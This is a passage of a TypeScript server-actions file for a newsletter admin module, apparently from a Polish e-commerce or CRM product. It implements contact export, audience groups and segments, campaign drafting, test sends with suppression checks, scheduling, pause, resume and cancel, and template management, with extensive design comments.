    const contacts = await contactsForExport(supabase, filter, LIMIT);

    const line = (contact: ContactRow): string => [
      contact.email,
      contact.firstName,
      contact.lastName,
      contact.locale,
      contact.sourceKey,
      contact.tags.join("|"),
      contact.marketingConsent ? "true" : "false",
      contact.consentAt,
      contact.consentSource,
      contact.consentVersion,
      contact.unsubscribedAt,
      contact.createdAt,
      contact.lastActivityAt,
      contact.lastSentAt,
    ].map(csvCell).join(",");

    // CRLF and a BOM: Excel opens a UTF-8 CSV as cp1250 without one, and a
    // Polish contact list without its diacritics is a broken export.
    const csv = `﻿${[EXPORT_COLUMNS.map(csvCell).join(","), ...contacts.map(line)].join("\r\n")}`;

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.contacts_exported",
      entityType: "newsletter_contact",
      after: { rows: contacts.length, filter: { ...filter } },
    });
    return { ok: true, data: { csv, rows: contacts.length, truncated: contacts.length >= LIMIT } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── GROUPS AND SEGMENTS ─────────────────────────────────────────────────── */

/**
 * Create or update a group — static list or saved filter, one table, one form.
 *
 * `is_dynamic` IS NOT EDITABLE AFTER CREATION, and the action quietly keeps the
 * stored value on update rather than trusting the form. Flipping a static group
 * to dynamic would orphan its membership rows; flipping a segment to static
 * would produce a group that is empty and looks broken. Neither is something an
 * operator means to do, and both are one mis-posted field away.
 */
export async function saveGroupAction(input: {
  id?: string;
  key: string;
  name: string;
  description?: string | null;
  isDynamic?: boolean;
  rules?: SegmentRules;
}): Promise<Result<{ id: string }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const name = (input.name ?? "").trim().slice(0, 120);
    if (!name) return { ok: false, error: "name" };
    const key = (input.key ?? "").trim().toLowerCase();
    if (!GROUP_KEY_RE.test(key)) return { ok: false, error: "key" };

    const rules = toSegmentRules(input.rules ?? {});

    if (input.id) {
      if (!isUuid(input.id)) return { ok: false, error: "missing" };
      const existing = await getGroup(supabase, input.id);
      if (!existing) return { ok: false, error: "missing" };
      const { error } = await supabase.from("newsletter_groups").update({
        key, name,
        description: clean(input.description, 400),
        // The stored flag wins; see the note above.
        rules: (existing.isDynamic ? rules : { match: "all", conditions: [] }) as never,
      }).eq("id", input.id);
      if (error) return { ok: false, error: error.code === "23505" ? "taken" : "generic" };
      await logAudit(supabase, {
        actorId: adminId, action: "newsletter.group_saved",
        entityType: "newsletter_group", entityId: input.id, after: { key, name },
      });
      invalidate(PATHS.groups, PATHS.contacts, PATHS.campaigns);
      return { ok: true, data: { id: input.id } };
    }

    const isDynamic = input.isDynamic === true;
    const { data: created, error } = await supabase.from("newsletter_groups").insert({
      key, name,
      description: clean(input.description, 400),
      is_dynamic: isDynamic,
      rules: (isDynamic ? rules : { match: "all", conditions: [] }) as never,
      created_by: adminId,
    }).select("id").single();
    if (error || !created) {
      return { ok: false, error: error?.code === "23505" ? "taken" : "generic" };
    }
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.group_created",
      entityType: "newsletter_group", entityId: created.id, after: { key, name, isDynamic },
    });
    invalidate(PATHS.groups, PATHS.contacts, PATHS.campaigns);
    return { ok: true, data: { id: created.id } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Delete a group.
 *
 * The membership rows cascade; the CONTACTS do not, and that asymmetry is the
 * whole point — deleting "Klienci premium" must not delete the customers. A
 * campaign that named this group in its audience keeps the id in its stored
 * JSON, where `audienceBreakdown` simply skips an id it cannot resolve, so an
 * old campaign's report stays readable instead of failing to load.
 */
export async function deleteGroupAction(id: string): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(id)) return { ok: false, error: "missing" };
    const group = await getGroup(supabase, id);
    if (!group) return { ok: false, error: "missing" };

    const { error } = await supabase.from("newsletter_groups").delete().eq("id", id);
    if (error) return { ok: false, error: "generic" };
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.group_deleted",
      entityType: "newsletter_group", entityId: id, before: { key: group.key, name: group.name },
    });
    invalidate(PATHS.groups, PATHS.contacts, PATHS.campaigns);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * How many contacts a set of conditions currently matches.
 *
 * A REAL COUNT, NOT AN ESTIMATE, and recomputed every time it is asked for,
 * because that is exactly what the segment will do when a campaign uses it.
 * A preview that was cheaper than the real thing would be a preview of
 * something else.
 */
export async function previewSegmentAction(rules: SegmentRules): Promise<Result<{ count: number }>> {
  try {
    const { supabase } = await requireAdmin();
    const ids = await resolveSegment(supabase, toSegmentRules(rules));
    return { ok: true, data: { count: ids.length } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── CAMPAIGNS ───────────────────────────────────────────────────────────── */

/**
 * A new draft, with its first message already in place.
 *
 * THE EMPTY STEP IS NOT A CONVENIENCE. Every campaign in this schema keeps its
 * body in `newsletter_campaign_steps` — a one-off is a campaign with exactly one
 * step at index 0 — so a campaign with no steps is one the content editor has
 * nothing to bind to and the scheduler would queue zero messages for. Creating
 * it here means every campaign is in a coherent state from its first moment.
 */
export async function createCampaignAction(input: {
  name: string;
  kind?: "one_off" | "sequence" | "automation";
  audience?: Audience;
}): Promise<Result<{ id: string }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const name = (input.name ?? "").trim().slice(0, 160);
    if (!name) return { ok: false, error: "name" };
    const kind = input.kind === "sequence" || input.kind === "automation" ? input.kind : "one_off";

    const { data: created, error } = await supabase.from("newsletter_campaigns").insert({
      name, kind, status: "draft",
      audience: toAudience(input.audience ?? {}) as never,
      created_by: adminId, updated_by: adminId,
    }).select("id").single();
    if (error || !created) return { ok: false, error: "generic" };

    const { error: stepError } = await supabase.from("newsletter_campaign_steps").insert({
      campaign_id: created.id, step_index: 0, variant: "A",
    });
    // A campaign without its step beats no campaign and a lost name; the
    // content screen's first save will create it through the same upsert.
    if (stepError) console.error("newsletter.createCampaign.step", stepError.message);

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.campaign_created",
      entityType: "newsletter_campaign", entityId: created.id, after: { name, kind },
    });
    invalidate(PATHS.campaigns, PATHS.dashboard);
    return { ok: true, data: { id: created.id } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * The campaign's settings: who it goes to, what is tracked, how A/B is run.
 *
 * AUDIENCE IS NOT REQUIRED HERE AND IS REQUIRED AT SEND. A draft is a thing an
 * operator builds over several sittings, and refusing to save a half-filled
 * wizard is how work gets lost. The audience check lives in
 * `scheduleCampaignAction`, which is the moment it actually has to be true.
 *
 * THE A/B DIALS ARE CLAMPED, NOT REFUSED. They come from sliders bounded by the
 * same numbers the database constrains; a value outside them is a bug or a
 * hand-posted form, and silently pulling it back into range is kinder than
 * making an operator hunt for which field a validation error refers to.
 */
export async function saveCampaignAction(input: {
  id: string;
  name?: string;
  audience?: Audience;
  trackOpens?: boolean;
  trackClicks?: boolean;
  utm?: Utm;
  abEnabled?: boolean;
  abSharePct?: number;
  abDecideAfterHours?: number;
  abMetric?: string;
  stopOnConversion?: boolean;
}): Promise<Result<{ id: string }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const gate = await editableCampaign(supabase, input.id);
    if (!gate.ok) return gate;

    const patch: Record<string, unknown> = { updated_by: adminId };

    if (input.name !== undefined) {
      const name = input.name.trim().slice(0, 160);
      if (!name) return { ok: false, error: "name" };
      patch.name = name;
    }
    if (input.audience !== undefined) patch.audience = toAudience(input.audience);
    if (input.trackOpens !== undefined) patch.track_opens = input.trackOpens === true;
    if (input.trackClicks !== undefined) patch.track_clicks = input.trackClicks === true;
    if (input.utm !== undefined) patch.utm = toUtm(input.utm);
    if (input.stopOnConversion !== undefined) patch.stop_on_conversion = input.stopOnConversion === true;
    if (input.abEnabled !== undefined) patch.ab_enabled = input.abEnabled === true;
    if (input.abSharePct !== undefined) {
      patch.ab_share_pct = Math.min(100, Math.max(2, Math.round(input.abSharePct)));
    }
    if (input.abDecideAfterHours !== undefined) {
      patch.ab_decide_after_hours = Math.min(168, Math.max(1, Math.round(input.abDecideAfterHours)));
    }
    if (input.abMetric !== undefined) {
      patch.ab_metric = (AB_METRICS as readonly string[]).includes(input.abMetric)
        ? input.abMetric : "click";
    }

    const { error } = await supabase.from("newsletter_campaigns")
      .update(patch as never).eq("id", input.id);
    if (error) return { ok: false, error: "generic" };

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.campaign_saved",
      entityType: "newsletter_campaign", entityId: input.id,
      after: { name: patch.name ?? gate.campaign.name },
    });
    invalidate(PATHS.campaigns, `${PATHS.campaigns}/${input.id}`, PATHS.dashboard);
    return { ok: true, data: { id: input.id } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * One message of a campaign — subject, preheader, body, delay, variant.
 *
 * AN UPSERT ON (campaign, step, variant), NOT AN INSERT-OR-UPDATE DANCE. That
 * triple is a unique index in the schema, so letting the database resolve the
 * collision makes a double-clicked "Zapisz", a retried action and a re-entered
 * editor all the same operation. Deciding in application code which one it is
 * means a race between two tabs writes two rows and the send doubles.
 *
 * `body_text` IS DELIBERATELY NOT WRITTEN. The plain-text alternative is derived
 * from the HTML by `renderCampaign` at send time; storing a second copy at save
 * time is storing something that drifts the moment a block changes, and a text
 * part that disagrees with the HTML part is worse than one that is generated.
 */
export async function saveStepAction(input: {
  campaignId: string;
  stepIndex?: number;
  variant?: string;
  subject?: string;
  preheader?: string;
  editor?: "builder" | "html";
  blocks?: MailBlock[];
  bodyHtml?: string;
  delayMinutes?: number;
}): Promise<Result<{ id: string }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const gate = await editableCampaign(supabase, input.campaignId);
    if (!gate.ok) return gate;

    const stepIndex = Math.min(50, Math.max(0, Math.round(input.stepIndex ?? 0)));
    const variant = input.variant === "B" || input.variant === "C" ? input.variant : "A";
    const editor = input.editor === "html" ? "html" : "builder";

    const { data: saved, error } = await supabase.from("newsletter_campaign_steps").upsert({
      campaign_id: input.campaignId,
      step_index: stepIndex,
      variant,
      // Step 0 goes out when the campaign starts; a delay on it would be a
      // schedule pretending to be a step, and the schedule already exists.
      delay_minutes: stepIndex === 0
        ? 0 : Math.min(525_600, Math.max(0, Math.round(input.delayMinutes ?? 0))),
      subject: (input.subject ?? "").replace(/[\r\n]+/g, " ").trim().slice(0, 300),
      preheader: (input.preheader ?? "").replace(/[\r\n]+/g, " ").trim().slice(0, 300),
      editor,
      blocks: (input.blocks ?? []) as never,
      body_html: (input.bodyHtml ?? "").slice(0, 400_000),
    }, { onConflict: "campaign_id,step_index,variant" }).select("id").single();
    if (error || !saved) return { ok: false, error: "generic" };

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.step_saved",
      entityType: "newsletter_campaign_step", entityId: saved.id,
      after: { campaignId: input.campaignId, stepIndex, variant, editor },
    });
    invalidate(`${PATHS.campaigns}/${input.campaignId}`, PATHS.campaigns);
    return { ok: true, data: { id: saved.id } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Remove one message from a campaign.
 *
 * Gaps in `step_index` are harmless: `snapshotRecipients` sorts the indices it
 * finds rather than counting from zero, so deleting the middle of a sequence
 * leaves the rest working. Deleting the LAST remaining step is allowed too —
 * the campaign simply becomes unsendable, and `scheduleCampaignAction` says so
 * with "subject"/"body" rather than this action inventing a refusal the
 * dictionary has no words for.
 */
export async function deleteStepAction(input: { campaignId: string; stepId: string }): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const gate = await editableCampaign(supabase, input.campaignId);
    if (!gate.ok) return gate;
    if (!isUuid(input.stepId)) return { ok: false, error: "missing" };

    const { error } = await supabase.from("newsletter_campaign_steps")
      .delete().eq("id", input.stepId).eq("campaign_id", input.campaignId);
    if (error) return { ok: false, error: "generic" };

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.step_deleted",
      entityType: "newsletter_campaign_step", entityId: input.stepId,
      before: { campaignId: input.campaignId },
    });
    invalidate(`${PATHS.campaigns}/${input.campaignId}`, PATHS.campaigns);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Delete a campaign and everything that describes it.
 *
 * Steps, recipients, events, links and attributions all cascade, so this erases
 * the report as well as the draft. A campaign mid-send refuses with "sending":
 * cancel it first, which stops the queue and keeps the record of what already
 * went out.
 */
export async function deleteCampaignAction(id: string): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const gate = await editableCampaign(supabase, id);
    if (!gate.ok) return gate;

    const { error } = await supabase.from("newsletter_campaigns").delete().eq("id", id);
    if (error) return { ok: false, error: "generic" };
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.campaign_deleted",
      entityType: "newsletter_campaign", entityId: id,
      before: { name: gate.campaign.name, status: gate.campaign.status },
    });
    invalidate(PATHS.campaigns, PATHS.dashboard, PATHS.analytics);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * What "wyślij do tych grup" really comes to once the list is deduplicated and
 * everybody who must not be mailed is removed.
 *
 * The contact ids `audienceBreakdown` also computes are dropped here on
 * purpose: the confirm screen needs seven numbers, not a few thousand uuids
 * crossing the wire into a client component.
 */
export async function audiencePreviewAction(audience: Audience): Promise<Result<AudienceBreakdown>> {
  try {
    const { supabase } = await requireAdmin();
    const full = await audienceBreakdown(supabase, toAudience(audience));
    const { ids: _ids, ...breakdown } = full;
    return { ok: true, data: breakdown };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── THE TEST SEND ───────────────────────────────────────────────────────── */

/**
 * The outgoing mailbox, assembled exactly the way `sendAuthMail` assembles it.
 *
 * One mailbox for the whole product: the same host, the same identity, the same
 * password read from the vault for the length of one send. A second transport
 * for marketing would mean a second thing to configure, a second thing to get
 * wrong, and a From address that does not match the one customers already trust.
 */
async function outboundMail(
  supabase: Client,
): Promise<{ smtp: SmtpConfig; identity: MailIdentity } | null> {
  const { config, secrets } = await readIntegrationSecrets<MailConfig>(supabase, "mail");
  const password = secrets.smtp_password
    ?? (config.smtp_same_as_imap ? secrets.imap_password : undefined);
  if (!config.smtp_host.trim() || !config.smtp_user.trim() || !password) return null;
  return {
    smtp: {
      host: config.smtp_host,
      port: config.smtp_port,
      user: config.smtp_user,
      encryption: config.smtp_encryption === "starttls" ? "tls"
        : config.smtp_encryption === "ssl" ? "ssl" : "auto",
      password,
    },
    identity: {
      from_name: config.from_name || "GrovBase",
      from_email: config.email,
      reply_to: config.email,
    },
  };
}

/**
 * Send this message to the operator, right now, and touch nothing else.
 *
 * A TEST WRITES NOTHING. No recipient rows, no events, no links, no attribution.
 * That is not an optimisation, it is the definition: the moment a test appears
 * in `newsletter_recipients` it is in the campaign's denominator, and every rate
 * the report shows afterwards is wrong by however many times the operator
 * previewed their own work. The same reasoning is why it renders with NO
 * tracking — a pixel and rewritten links would put the operator's own opens and
 * clicks into the campaign's numbers, and would also make the test message a
 * different document from the one the recipient reads.
 *
 * THE UNSUBSCRIBE LINK IS A PLACEHOLDER pointing at the site origin, and no
 * List-Unsubscribe header is set. A real token here would let a mistyped test
 * address unsubscribe a real contact, and a one-click header on a message that
 * belongs to nobody has nothing to unsubscribe.
 *
 * AND THE MERGE VALUES ARE THE EMPTY CASE ON PURPOSE. The test renders with no
 * first name, so the operator sees what the contact who never filled one in
 * will see. "Cześć ," is the single most recognisable sign of a broken mailing,
 * and a test that hides it is a test that guarantees it ships.
 */
export async function sendTestCampaignAction(input: {
  campaignId: string;
  /** Which message to test. Omitted = the campaign's first step. */
  stepId?: string;
  addresses: string[];
}): Promise<Result<{ sent: number; failed: number }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(input.campaignId)) return { ok: false, error: "missing" };

    const addresses = (input.addresses ?? []).map(normEmail).filter(Boolean);
    if (addresses.length === 0) return { ok: false, error: "email" };
    if (addresses.length > 5) return { ok: false, error: "tooMany" };
    if (addresses.some((a) => !isEmail(a))) return { ok: false, error: "email" };

    /*
      THE SUPPRESSION LIST APPLIES TO A TEST TOO, AND IT IS THE ONLY PLACE IN
      THIS FILE THAT HAS TO SAY SO.

      Everywhere else the queue is the guard: `newsletter_queue_claim` re-checks
      consent, unsubscription and suppression on every batch, so no action here
      needs to remember. A test does not go through the queue — it renders a
      step and hands it straight to the mailer — so this is the one send in the
      module with nothing between it and the mail server.

      That matters because the address is TYPED, and the reason to type a
      customer's address into this box ("does it look right for them?") is
      exactly the case where they may have unsubscribed. The suppressions screen
      promises "adresy, na które nie wyślemy nic, nawet przez pomyłkę"; a test
      send is precisely the pomyłka that sentence is about. Refused as a whole
      rather than filtered silently, because an operator who is told "sent" while
      one of their five addresses was dropped has learnt something untrue.
    */
    const blocked = await suppressedAmong(supabase, addresses);
    if (blocked.size > 0) return { ok: false, error: "suppressedAddress" };

    const campaign = await getCampaign(supabase, input.campaignId);
    if (!campaign) return { ok: false, error: "missing" };
    const steps = await listSteps(supabase, input.campaignId);
    const step = input.stepId ? steps.find((s) => s.id === input.stepId) : steps[0];
    if (!step) return { ok: false, error: "missing" };
    if (!step.subject.trim()) return { ok: false, error: "subject" };
    if (!stepHasBody(step)) return { ok: false, error: "body" };

    const mail = await outboundMail(supabase);
    if (!mail) return { ok: false, error: "notConfigured" };
    const mailer = bulkMailer(mail.smtp, mail.identity, {
      connections: 1, messagesPerConnection: 5, limit: 5, deltaMs: 60_000,
    });
    if (!mailer) return { ok: false, error: "notConfigured" };

    let sent = 0, failed = 0;
    try {
      for (const to of addresses) {
        const rendered = renderCampaign({
          editor: step.editor,
          blocks: step.blocks,
          bodyHtml: step.bodyHtml,
          subject: step.subject,
          preheader: step.preheader,
          merge: { email: to },
          unsubscribeUrl: SITE_URL,
          locale: "pl",
        });
        const result = await mailer.send({
          to,
          // A bracketed marker rather than a sentence: it has to be legible in
          // an inbox list in every locale, and it is not copy the dictionary
          // owns. Without it a test and the real thing are indistinguishable
          // in the operator's own mailbox.
          subject: `[TEST] ${rendered.subject}`.slice(0, 200),
          text: rendered.text,
          html: rendered.html,
          messageId: mailer.newMessageId(),
        });
        if (result.sent) sent += 1; else failed += 1;
      }
    } finally {
      mailer.close();
    }

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.test_sent",
      entityType: "newsletter_campaign", entityId: input.campaignId,
      // The count, never the addresses: an audit log is not a place to
      // accumulate a second copy of anybody's mailbox.
      after: { stepId: step.id, requested: addresses.length, sent, failed },
    });

    // Nothing accepted means the mailbox answered no to every address. Saying
    // "Test wysłany" then would be the module's first lie.
    if (sent === 0) return { ok: false, error: "generic" };
    return { ok: true, data: { sent, failed } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── SCHEDULING ──────────────────────────────────────────────────────────── */

/**
 * The moment a campaign stops being a draft.
 *
 * THE ORDER OF THE THREE WRITES IS LOAD-BEARING.
 *
 *   1. `ensureLinks` first, because the renderer resolves an href to a link id
 *      and falls back to the plain destination when it cannot. Registering the
 *      links after the queue exists means the first messages out of the door
 *      have untracked links while the settings screen still says tracking is
 *      on — silently, and only for the recipients who mattered most.
 *   2. `snapshotRecipients` second: every message that will ever be sent
 *      becomes a row now, at a `send_after` computed from the cumulative
 *      delays, so a later step is cancellable and no step depends on a worker
 *      invocation having survived.
 *   3. The status LAST. `newsletter_queue_claim` only hands out rows whose
 *      campaign is 'sending'; flipping the status before the rows exist would
 *      be a race with nothing to win, and flipping it after means the queue is
 *      complete the instant it opens.
 *
 * AND IT IS SAFE TO RUN TWICE. Every recipient insert lands on
 * `newsletter_recipients_once (campaign, step, contact)`, so a double-tapped
 * button, a retried action and a re-scheduled campaign all collide with the
 * index and lose. Nothing in this function has to be careful, which is the
 * point — careful code is code that stops being careful during an incident.
 */
export async function scheduleCampaignAction(input: {
  campaignId: string;
  when: "now" | "at";
  /** ISO 8601, with an offset. Required when `when` is "at". */
  at?: string;
}): Promise<Result<{ status: CampaignStatus; recipients: number; scheduledAt: string | null }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(input.campaignId)) return { ok: false, error: "missing" };
    const campaign = await getCampaign(supabase, input.campaignId);
    if (!campaign) return { ok: false, error: "missing" };
    // Already handing messages to the mail server: pause it before rescheduling.
    if (campaign.status === "sending") return { ok: false, error: "sending" };

    if (campaign.audience.include.length === 0) return { ok: false, error: "audience" };

    const steps = await listSteps(supabase, input.campaignId);
    // A campaign with no steps has nothing to send. EVERY step is checked, not
    // just the first: an A/B variant left half-written would otherwise go out
    // as an empty message to whichever half of the audience drew it.
    if (steps.length === 0) return { ok: false, error: "body" };
    for (const step of steps) {
      if (!step.subject.trim()) return { ok: false, error: "subject" };
      if (!stepHasBody(step)) return { ok: false, error: "body" };
    }

    let startAt = new Date();
    let scheduledAt: string | null = null;
    if (input.when === "at") {
      const parsed = new Date(input.at ?? "");
      if (Number.isNaN(parsed.getTime())) return { ok: false, error: "date" };
      // One minute of slack: a confirm dialog the operator reads for ten
      // seconds must not turn "za minutę" into "ta godzina już minęła".
      if (parsed.getTime() <= Date.now() - 60_000) return { ok: false, error: "past" };
      startAt = parsed;
      scheduledAt = parsed.toISOString();
    }

    // 1. LINKS. Collected with the campaign's own UTM tags, because the
    //    renderer looks a link up by its FINAL tagged form — collecting the
    //    untagged one would make every lookup miss.
    const urls = new Set<string>();
    for (const step of steps) {
      for (const url of collectUrls(
        { editor: step.editor, blocks: step.blocks, bodyHtml: step.bodyHtml },
        campaign.utm,
      )) urls.add(url);
    }
    await ensureLinks(supabase, campaign.id, [...urls]);

    // 2. THE QUEUE.
    //
    //    THE GATE IS `queued`, NOT `mailable`. `mailable` says how many people
    //    COULD be written to; `queued` says how many rows are actually pending.
    //    They differ whenever a cancelled campaign is rescheduled — the
    //    cancelled rows still hold the unique index, so nothing new is inserted
    //    and the queue stays empty — and gating on `mailable` there flipped the
    //    campaign to 'sending' and reported four thousand recipients for a send
    //    of nothing at all.
    const snapshot = await snapshotRecipients(supabase, campaign, steps, { startAt });
    if (snapshot.queued === 0) return { ok: false, error: "noRecipients" };

    // 3. THE STATUS.
    const status: CampaignStatus = input.when === "at" ? "scheduled" : "sending";
    const { error } = await supabase.from("newsletter_campaigns").update({
      status,
      scheduled_at: scheduledAt,
      started_at: status === "sending" ? new Date().toISOString() : null,
      finished_at: null,
      updated_by: adminId,
    } as never).eq("id", campaign.id);
    if (error) return { ok: false, error: "generic" };

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.campaign_scheduled",
      entityType: "newsletter_campaign", entityId: campaign.id,
      after: {
        status, scheduledAt,
        created: snapshot.created, queued: snapshot.queued,
        mailable: snapshot.mailable, links: urls.size,
      },
    });
    invalidate(PATHS.campaigns, `${PATHS.campaigns}/${campaign.id}`, PATHS.dashboard, PATHS.analytics);
    // `queued`, so the toast the operator reads counts the messages that are
    // about to leave rather than the size of the audience they were drawn from.
    // With A/B on those are different numbers by design.
    return { ok: true, data: { status, recipients: snapshot.queued, scheduledAt } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Stop handing out work, within one batch.
 *
 * Nothing is undone and nothing is cancelled: `newsletter_queue_claim` joins on
 * the campaign and only claims rows whose campaign says 'sending', so changing
 * one column here is what makes "Wstrzymaj" take effect on the very next batch
 * instead of at the end of the send. The rows stay pending and resume where
 * they stopped.
 */
export async function pauseCampaignAction(id: string): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(id)) return { ok: false, error: "missing" };
    const campaign = await getCampaign(supabase, id);
    if (!campaign) return { ok: false, error: "missing" };
    // The button was rendered when the campaign was live and the send has
    // finished since. That is a stale page, not a missing campaign, and the
    // operator needs to be told to refresh rather than to try again.
    if (campaign.status !== "sending" && campaign.status !== "scheduled") {
      return { ok: false, error: "state" };
    }

    const { error } = await supabase.from("newsletter_campaigns")
      .update({ status: "paused", updated_by: adminId } as never).eq("id", id);
    if (error) return { ok: false, error: "generic" };
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.campaign_paused",
      entityType: "newsletter_campaign", entityId: id, before: { status: campaign.status },
    });
    invalidate(PATHS.campaigns, `${PATHS.campaigns}/${id}`, PATHS.dashboard);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/** The mirror of the pause: the queue is untouched, so the send continues from
 *  exactly where it stopped rather than starting again. */
export async function resumeCampaignAction(id: string): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(id)) return { ok: false, error: "missing" };
    const campaign = await getCampaign(supabase, id);
    if (!campaign) return { ok: false, error: "missing" };
    if (campaign.status !== "paused") return { ok: false, error: "state" };

    const { error } = await supabase.from("newsletter_campaigns").update({
      status: "sending",
      started_at: campaign.startedAt ?? new Date().toISOString(),
      updated_by: adminId,
    } as never).eq("id", id);
    if (error) return { ok: false, error: "generic" };
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.campaign_resumed",
      entityType: "newsletter_campaign", entityId: id,
    });
    invalidate(PATHS.campaigns, `${PATHS.campaigns}/${id}`, PATHS.dashboard);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Stop the campaign for good.
 *
 * The queued rows are cancelled rather than deleted, so the report can still
 * say how many messages were never sent and why the totals do not match the
 * audience. WHAT HAS ALREADY BEEN ACCEPTED BY THE MAIL SERVER CANNOT BE
 * RECALLED, and the dictionary's own confirmation text says exactly that —
 * nothing here pretends otherwise.
 *
 * A CAMPAIGN THAT IS ALREADY FINISHED IS NOT CANCELLABLE. Stamping 'cancelled'
 * over 'sent' would rewrite what happened: the report would describe a campaign
 * that was stopped, when in fact every message went out.
 */
export async function cancelCampaignAction(id: string): Promise<Result<{ cancelled: number }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(id)) return { ok: false, error: "missing" };
    const campaign = await getCampaign(supabase, id);
    if (!campaign) return { ok: false, error: "missing" };
    const stoppable: CampaignStatus[] = ["draft", "scheduled", "sending", "paused"];
    if (!stoppable.includes(campaign.status)) return { ok: false, error: "state" };

    const { data: stopped, error } = await supabase.from("newsletter_recipients")
      .update({ status: "cancelled" } as never)
      .eq("campaign_id", id).in("status", ["pending", "sending"]).select("id");
    if (error) return { ok: false, error: "generic" };

    const { error: statusError } = await supabase.from("newsletter_campaigns").update({
      status: "cancelled", finished_at: new Date().toISOString(), updated_by: adminId,
    } as never).eq("id", id);
    if (statusError) return { ok: false, error: "generic" };

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.campaign_cancelled",
      entityType: "newsletter_campaign", entityId: id,
      before: { status: campaign.status },
      after: { cancelledRows: (stopped ?? []).length },
    });
    invalidate(PATHS.campaigns, `${PATHS.campaigns}/${id}`, PATHS.dashboard, PATHS.analytics);
    return { ok: true, data: { cancelled: (stopped ?? []).length } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── TEMPLATES ───────────────────────────────────────────────────────────── */

/**
 * Save a starting point.
 *
 * `is_builtin` is never settable from here. A built-in is something this
 * repository ships and an operator copies; letting the panel mint one would
 * create a template nobody can delete and nobody can account for.
 */
export async function saveTemplateAction(input: {
  id?: string;
  name: string;
  category?: string;
  subject?: string;
  preheader?: string;
  editor?: "builder" | "html";
  blocks?: MailBlock[];
  bodyHtml?: string;
}): Promise<Result<{ id: string }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const name = (input.name ?? "").trim().slice(0, 160);
    if (!name) return { ok: false, error: "name" };

    const row = {
      name,
      category: clean(input.category, 40) ?? "custom",
      subject: (input.subject ?? "").replace(/[\r\n]+/g, " ").trim().slice(0, 300),
      preheader: (input.preheader ?? "").replace(/[\r\n]+/g, " ").trim().slice(0, 300),
      editor: input.editor === "html" ? "html" : "builder",
      blocks: (input.blocks ?? []) as never,
      body_html: (input.bodyHtml ?? "").slice(0, 400_000),
    };

    if (input.id) {
      if (!isUuid(input.id)) return { ok: false, error: "missing" };
      const existing = await getTemplate(supabase, input.id);
      if (!existing) return { ok: false, error: "missing" };
      const { error } = await supabase.from("newsletter_templates")
        .update(row as never).eq("id", input.id);
      if (error) return { ok: false, error: "generic" };
      await logAudit(supabase, {
        actorId: adminId, action: "newsletter.template_saved",
        entityType: "newsletter_template", entityId: input.id, after: { name },
      });
      invalidate(PATHS.templates);
      return { ok: true, data: { id: input.id } };
    }

    const { data: created, error } = await supabase.from("newsletter_templates")
      .insert({ ...row, is_builtin: false, created_by: adminId }).select("id").single();
    if (error || !created) return { ok: false, error: "generic" };
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.template_created",
      entityType: "newsletter_template", entityId: created.id, after: { name },
    });
    invalidate(PATHS.templates);
    return { ok: true, data: { id: created.id } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Delete an operator's own template.
 *
 * A BUILT-IN CANNOT BE DELETED, and the check is here as well as in the UI
 * because hiding a button is not a rule. Built-ins are the module's shipped
 * starting points — an operator who does not want one copies it and edits the
 * copy; deleting it would take it away from every future campaign and no
 * migration would put it back.
 */
export async function deleteTemplateAction(id: string): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(id)) return { ok: false, error: "missing" };
    const template = await getTemplate(supabase, id);
    if (!template) return { ok: false, error: "missing" };
    if (template.isBuiltin) return { ok: false, error: "builtin" };

    const { error } = await supabase.from("newsletter_templates").delete().eq("id", id);
    if (error) return { ok: false, error: "generic" };
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.template_deleted",
      entityType: "newsletter_template", entityId: id, before: { name: template.name },
    });
    invalidate(PATHS.templates);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Start from a template.
 *
 * TWO CALLERS, ONE ACTION. From the templates screen there is no campaign yet,
 * so one is created as a draft carrying the template's name; from inside the
 * content editor there is, and the template's body replaces that step. The
